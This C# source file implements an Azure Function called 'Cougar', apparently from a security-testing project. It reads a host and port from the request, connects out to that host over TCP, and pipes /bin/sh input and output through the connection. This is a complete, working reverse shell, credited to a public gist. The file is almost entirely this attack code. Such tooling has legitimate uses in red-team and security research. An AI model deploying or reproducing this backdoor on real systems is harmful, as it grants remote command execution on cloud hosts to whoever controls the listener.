/*
References:
https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
*/

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Azure.WebJobs;
using Microsoft.Azure.WebJobs.Extensions.Http;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;

class Response
{
    public string message { get; set; }
}

class Responses
{
    public static HttpResponseMessage error(string message, HttpStatusCode statusCode)
    {
        Response data = new Response();
        data.message = message;

        string json = JsonConvert.SerializeObject(data);

        return new HttpResponseMessage(statusCode)
        {
            Content = new StringContent(json, Encoding.UTF8, "application/json")
        };
    }
}

namespace Puma.Security.Functions.Azure
{
    public static class Cougar
    {
        static StreamWriter streamWriter;
        static ILogger logger;
        
        [FunctionName("Cougar")]
        public static async Task<HttpResponseMessage> Run(
            [HttpTrigger(AuthorizationLevel.Function, "get", Route = null)] HttpRequest req,
            ILogger log)
        {
            logger = log;

            logger.LogInformation("Processing Cougar request.");

            string host = req.Query["host"];
            string port = req.Query["port"];

            if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(port))
            {
                return Responses.error("Must provide the host and port for the target TCP server as query parameters.", HttpStatusCode.BadRequest);
            }

            //Parse port number
            int portNum;
            if(!int.TryParse(port, out portNum))
                return Responses.error("Port number must be an integer.", HttpStatusCode.BadRequest);

            try
            {
                using (TcpClient client = new TcpClient(host, portNum))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "/bin/sh";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(cmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                string line = rdr.ReadLine();

                                if (line == null)
                                {
                                    break;
                                }

                                strInput.Append(line);
                                p.StandardInput.WriteLine(strInput.ToString());
                                strInput.Remove(0, strInput.Length);
                            }

                            return Responses.error("Connection terminated from client.", HttpStatusCode.InternalServerError);
                        }
                    }
                }
            }
            catch (Exception err)
            {
                return Responses.error(err.ToString(), HttpStatusCode.InternalServerError);
            }
        }

        private static void cmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!string.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput.ToString());
                    streamWriter.Flush();
                }
                catch (Exception err)
                {
                    logger.LogInformation($"Error writing output: {err}");
                }
            }
        }
    }
}
